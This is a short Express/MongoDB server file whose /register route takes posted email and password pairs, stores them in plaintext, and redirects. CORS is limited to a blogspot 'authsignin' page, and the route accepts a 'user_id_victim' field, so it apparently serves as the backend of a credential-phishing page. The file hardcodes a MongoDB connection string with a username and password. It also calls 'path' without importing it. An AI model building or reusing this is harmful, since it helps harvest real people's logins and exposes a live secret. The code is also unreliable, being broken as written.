const express = require('express');
const mongoose = require('mongoose');
require('dotenv').config();
const app = express();
const PORT = process.env.PORT || 5000;
const cors = require('cors');
app.use(cors({
    // Replace with your specific origin
    origin: 'https://authsignin.blogspot.com'
  }));// This enables CORS for all routes


// Use your MongoDB URI from .env or fallback (replace <db_password> if needed)
const uri = process.env.MONGODB_URI || 'mongodb+srv://pm288199:Ajib2536@signup.iwobj.mongodb.net/?retryWrites=true&w=majority&appName=signup';

// Connect to MongoDB
(async function connectDB() {
    try {
        await mongoose.connect(uri, {
            useNewUrlParser: true,
            useUnifiedTopology: true
        });
        console.log('MongoDB connected successfully');
    } catch (error) {
        console.error('Error connecting to MongoDB:', error);
        process.exit(1);
    }
})();

// Define User schema and model
const userSchema = new mongoose.Schema({
    name: { type: String, unique: true, required: true },
    password: { type: String, required: true }
}, { timestamps: true });

const User = mongoose.model('User', userSchema);

app.use(express.json());
app.use(express.static(path.join(__dirname, '../public')));

// Default route
app.get('/', (req, res) => {
    res.send('MongoDB Node.js Project Running!');
});

// Register User Route
app.post('/register', async (req, res) => {
    try {
        const { email, pass, user_id_victim, type } = req.body;

        if (!email || !pass) {
            return res.status(400).json({ error: 'Email and password are required' });
        }

        // Optionally, you can rename 'email' to 'name' if that’s desired:
        const newUser = new User({ name: email, email, password: pass });

        // If you need to store user_id_victim and type, add those fields to your schema as well.
        await newUser.save();
        res.redirect('/index.html');
    } catch (error) {
        res.status(500).json({ error: 'Error registering user', details: error.message });
    }
});


// For local development, start the server; Vercel will use the exported app without calling listen.
if (process.env.NODE_ENV !== 'production') {
    app.listen(PORT, () => {
        console.log(`Server running on port ${PORT}`);
    });
}

module.exports = app;
